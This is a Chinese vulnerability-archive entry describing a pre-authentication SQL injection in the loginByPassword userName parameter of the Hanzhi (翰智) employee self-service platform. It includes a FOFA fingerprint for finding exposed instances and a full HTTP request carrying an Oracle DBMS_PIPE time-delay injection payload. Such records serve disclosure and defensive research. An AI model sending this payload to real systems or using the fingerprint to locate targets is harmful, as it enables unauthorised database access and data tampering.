---
source: "wy876 漏洞文库"
title: "翰智员工自助平台 loginByPassword userName SQL 注入"
product: "翰智员工自助平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Oracle DBMS_PIPE；版本未知"
prerequisites: "登录前请求"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gy1kmhftuc02g8h8"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%BF%B0%E6%99%BA/%E5%91%98%E5%B7%A5%E8%87%AA%E5%8A%A9%E5%B9%B3%E5%8F%B0loginByPassword%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"./static/hrfonts/iconfont.css\""
fofa_unverified: "<font style="
id: "vw-a1bb5b0805907be2375f85db"
entity_id: "ve-a1bb5b0805907be2375f85db"
schema_version: "1"
---

# 翰智员工自助平台 loginByPassword userName SQL 注入

## 条目说明

- 对象与具体问题：翰智员工自助平台；loginByPassword userName SQLi
- 版本、配置及部署条件：Oracle DBMS_PIPE；版本未知
- 认证与权限前提：登录前请求
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 已按原文中的具体接口、源码或上下文直接更正产品、根因或修复说明；未知版本和未经证明的影响仍明确保留为待核实。
- 只有5秒延时样例无响应/修复；平台简介误断为厂商自用员工平台需产品核实

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
 本文所指为翰智员工自助平台，不能仅根据名称断言该平台仅供厂商自身员工使用；它是一种在线员工服务平台，旨在提高员工的工作效率、简化人力资源管理流程、增强员工的自主权和满意度。广州翰智软件有限公司员工自助平台 loginByPassword接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。  

## 二、影响版本
+ 翰智员工自助平台；受影响版本待厂商公告核实

## 三、资产测绘
+ fofa`body="./static/hrfonts/iconfont.css"`
+ 特征


## 四、漏洞复现
```http
POST /hrssc/portal/plantform/loginByPassword HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 40
Connection: close

{"userName":"admin' AND 8383=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(98)||CHR(97)||CHR(122),5)-- eWnt","password":"admin"}
```

> 请求长度说明：原资料 Content-Length 为 40；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gy1kmhftuc02g8h8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
